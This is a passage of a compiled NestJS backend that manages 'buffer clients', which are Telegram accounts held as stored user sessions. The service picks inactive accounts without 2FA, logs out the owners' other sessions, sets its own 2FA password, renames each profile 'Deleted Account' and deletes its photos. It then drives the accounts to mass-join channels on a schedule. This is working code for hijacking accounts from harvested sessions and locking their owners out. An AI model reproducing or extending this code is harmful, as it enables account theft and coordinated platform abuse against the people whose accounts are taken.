const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
let BufferClientModule = class BufferClientModule {
};
exports.BufferClientModule = BufferClientModule;
exports.BufferClientModule = BufferClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'bufferClientModule', schema: buffer_client_schema_1.BufferClientSchema, collection: 'bufferClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule)
        ],
        controllers: [buffer_client_controller_1.BufferClientController],
        providers: [buffer_client_service_1.BufferClientService],
        exports: [buffer_client_service_1.BufferClientService]
    })
], BufferClientModule);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.service.ts":
/*!****************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.service.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var BufferClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ./../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const promote_client_service_1 = __webpack_require__(/*! ../promote-clients/promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
let BufferClientService = BufferClientService_1 = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, promoteClientService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.promoteClientService = promoteClientService;
        this.logger = new common_1.Logger(BufferClientService_1.name);
        this.joinChannelMap = new Map();
        this.leaveChannelMap = new Map();
        this.isJoinChannelProcessing = false;
        this.isLeaveChannelProcessing = false;
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
    }
    async onModuleDestroy() {
        this.logger.log('Cleaning up BufferClientService resources');
        this.clearBufferMap();
        this.clearLeaveMap();
        await connection_manager_1.connectionManager.disconnectAll();
    }
    async create(bufferClient) {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }
    async findAll() {
        return this.bufferClientModel.find().exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.bufferClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log("creating");
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);
        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromBufferMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearBufferMap() {
        console.log("BufferMap cleared");
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
    }
    async joinchannelForBufferClients(skipExisting = true) {
        if (!this.telegramService.getActiveClientSetup()) {
            this.logger.log('Starting join channel process');
            await connection_manager_1.connectionManager.disconnectAll();
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            await (0, Helpers_1.sleep)(2000);
            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
            const clients = await this.bufferClientModel.find({ channels: { "$lt": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);
            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);
            if (clients.length > 0) {
                for (const document of clients) {
                    try {
                        const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });
                        this.logger.log(`Started joining process for mobile: ${document.mobile}`);
                        const channels = await client.channelInfo(true);
                        this.logger.debug(`Client ${document.mobile} has ${channels.ids.length} existing channels`);
                        await this.update(document.mobile, { channels: channels.ids.length });
                        this.logger.debug(`Client ${document.mobile} has ${channels.canSendFalseChats.length} channels that can't send messages`);
                        let result = [];
                        if (channels.canSendFalseCount < 10) {
                            if (channels.ids.length < 220) {
                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            else {
                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            this.logger.debug(`Adding ${result.length} new channels to join queue for ${document.mobile}`);
                            this.joinChannelMap.set(document.mobile, result);
                            this.joinChannelQueue();
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                        else {
                            this.logger.warn(`Client ${document.mobile} has too many restricted channels, moving to leave queue: ${channels.canSendFalseChats.length}`);
                            this.joinChannelMap.delete(document.mobile);
                            this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);
                            this.leaveChannelQueue();
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                    }
                    catch (error) {
                        if (error.message === "SESSION_REVOKED" ||
                            error.message === "AUTH_KEY_UNREGISTERED" ||
                            error.message === "USER_DEACTIVATED" ||
                            error.message === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${document.mobile}, removing client`, error.stack);
                            await this.remove(document.mobile);
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                        (0, parseError_1.parseError)(error);
                    }
                }
            }
            this.logger.log(`Join channel process initiated for ${clients.length} clients`);
            return `Initiated Joining channels ${clients.length}`;
        }
        else {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
        }
    }
    async joinChannelQueue() {
        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {
            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }
        this.isJoinChannelProcessing = true;
        this.joinChannelIntervalId = setInterval(async () => {
            let processTimeout;
            try {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length === 0) {
                    this.clearJoinChannelInterval();
                    return;
                }
                processTimeout = setTimeout(() => {
                    this.logger.error('Join channel interval processing timeout');
                    this.clearJoinChannelInterval();
                }, this.JOIN_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);
                for (const mobile of keys) {
                    let currentChannel = null;
                    try {
                        const channels = this.joinChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                            this.removeFromBufferMap(mobile);
                            continue;
                        }
                        currentChannel = channels.shift();
                        this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);
                        this.joinChannelMap.set(mobile, channels);
                        const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to join channel: @${currentChannel.username}`);
                        await this.telegramService.tryJoiningChannel(mobile, currentChannel);
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Outer Err ERR: `, false);
                        this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);
                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                            this.removeFromBufferMap(mobile);
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }
                        if (error.errorMessage === "SESSION_REVOKED" ||
                            error.errorMessage === "AUTH_KEY_UNREGISTERED" ||
                            error.errorMessage === "USER_DEACTIVATED" ||
                            error.errorMessage === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            this.removeFromBufferMap(mobile);
                            await this.remove(mobile);
                        }
                        try {
                            await connection_manager_1.connectionManager.unregisterClient(mobile);
                        }
                        catch (unregisterError) {
                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                        }
                    }
                }
            }
            catch (error) {
                this.logger.error('Error in join channel interval', error);
                this.clearJoinChannelInterval();
            }
            finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.JOIN_CHANNEL_INTERVAL);
        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size > 0) {
                setTimeout(() => {
                    this.logger.debug('Triggering next join channel process');
                    this.joinchannelForBufferClients(false);
                }, 30000);
            }
        }
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        console.log("LeaveMap cleared");
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
    }
    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {
            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        this.isLeaveChannelProcessing = true;
        this.leaveChannelIntervalId = setInterval(async () => {
            let processTimeout;
            try {
                const keys = Array.from(this.leaveChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.debug('Leave map is empty, clearing interval');
                    this.clearLeaveChannelInterval();
                    return;
                }
                processTimeout = setTimeout(() => {
                    this.logger.error('Leave channel interval processing timeout');
                    this.clearLeaveChannelInterval();
                }, this.LEAVE_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);
                for (const mobile of keys) {
                    try {
                        const channels = this.leaveChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                            this.removeFromLeaveMap(mobile);
                            continue;
                        }
                        const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                        this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);
                        if (channels.length > 0) {
                            this.leaveChannelMap.set(mobile, channels);
                        }
                        else {
                            this.removeFromLeaveMap(mobile);
                        }
                        const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);
                        await client.leaveChannels(channelsToProcess);
                        this.logger.debug(`${mobile} left channels successfully`);
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} Leave Channel ERR: `, false);
                        if (errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            await this.remove(mobile);
                            this.removeFromLeaveMap(mobile);
                        }
                        try {
                            await connection_manager_1.connectionManager.unregisterClient(mobile);
                        }
                        catch (unregisterError) {
                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                        }
                    }
                }
            }
            catch (error) {
                this.logger.error('Error in leave channel interval', error);
                this.clearLeaveChannelInterval();
            }
            finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.LEAVE_CHANNEL_INTERVAL);
        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsBufferClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                const bufferClient = {
                    tgId: user.tgId,
                    session: user.session,
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                };
                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, errorDetails.status);
            }
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            return "Client set as buffer successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkBufferClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await connection_manager_1.connectionManager.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            const bufferclients = await this.findAll();
            let goodIds = [];
            const badIds = [];
            if (bufferclients.length < 70) {
                for (let i = 0; i < 70 - bufferclients.length; i++) {
                    badIds.push(i.toString());
                }
            }
            const clients = await this.clientService.findAll();
            const promoteclients = await this.promoteClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => client.promoteMobile)].filter(Boolean);
            const promoteclientIds = promoteclients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of bufferclients) {
                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {
                    try {
                        const cli = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });
                        try {
                            const me = await cli.getMe();
                            if (me.username) {
                                await this.telegramService.updateUsername(document.mobile, '');
                                await (0, Helpers_1.sleep)(2000);
                            }
                            if (me.firstName !== "Deleted Account") {
                                await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                                await (0, Helpers_1.sleep)(2000);
                            }
                            await this.telegramService.deleteProfilePhotos(document.mobile);
                            const hasPassword = await cli.hasPassword();
                            if (!hasPassword) {
                                this.logger.warn("Client does not have password");
                                badIds.push(document.mobile);
                            }
                            else {
                                this.logger.debug(document.mobile + " : ALL Good");
                                goodIds.push(document.mobile);
                            }
                        }
                        catch (innerError) {
                            this.logger.error(`Error processing client ${document.mobile}: ${innerError.message}`);
                            badIds.push(document.mobile);
                            await this.remove(document.mobile);
                        }
                        finally {
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (error) {
                        this.logger.error(`Error with client ${document.mobile}: ${error.message}`);
                        (0, parseError_1.parseError)(error);
                        badIds.push(document.mobile);
                        await this.remove(document.mobile);
                        try {
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                        catch (unregisterError) {
                            this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                        }
                    }
                }
                else {
                    this.logger.warn("Number is a Active Client");
                    goodIds.push(document.mobile);
                    await this.remove(document.mobile);
                }
            }
            goodIds = [...new Set([...goodIds, ...clientIds, ...promoteclientIds])];
            this.logger.debug(`GoodIds: ${goodIds.length}, BadIds: ${badIds.length}`);
            await this.addNewUserstoBufferClients(badIds, goodIds);
        }
        else {
            this.logger.warn("Ignored active check buffer channels as active client setup exists");
        }
    }
    async addNewUserstoBufferClients(badIds, goodIds) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({
            mobile: { $nin: goodIds },
            expired: false,
            twoFA: false,
            lastActive: { $lt: sixMonthsAgo },
            totalChats: { $gt: 250 }
        }, { tgId: 1 }, badIds.length + 3);
        this.logger.debug(`New buffer documents to be added: ${documents.length}`);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId || !document.session) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }
            try {
                const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false });
                try {
                    const hasPassword = await client.hasPassword();
                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        this.logger.debug("Waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        await (0, Helpers_1.sleep)(2000);
                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);
                        this.logger.debug("Creating buffer client document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        };
                        await this.create(bufferClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        this.logger.debug("=============Created BufferClient=============");
                        badIds.pop();
                    }
                    else {
                        this.logger.warn("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                    }
                }
                catch (error) {
                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                    (0, parseError_1.parseError)(error);
                }
                finally {
                    try {
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                    catch (unregisterError) {
                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                    }
                }
            }
            catch (error) {
                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);
                (0, parseError_1.parseError)(error);
            }
        }
        setTimeout(() => {
            this.joinchannelForBufferClients();
        }, 2 * 60 * 1000);
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = BufferClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        promote_client_service_1.PromoteClientService])
], BufferClientService);


/***/ }),

/***/ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/create-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateBufferClientDto {
}
exports.CreateBufferClientDto = CreateBufferClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Session identifier',
        example: 'session123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/search-buffer- client.dto.ts":
/*!************************************************************************!*\
  !*** ./src/components/buffer-clients/dto/search-buffer- client.dto.ts ***!
  \************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchBufferClientDto {
}
exports.SearchBufferClientDto = SearchBufferClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'availableDate of the bufferClient',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Session identifier',
        example: 'session123',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/update-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
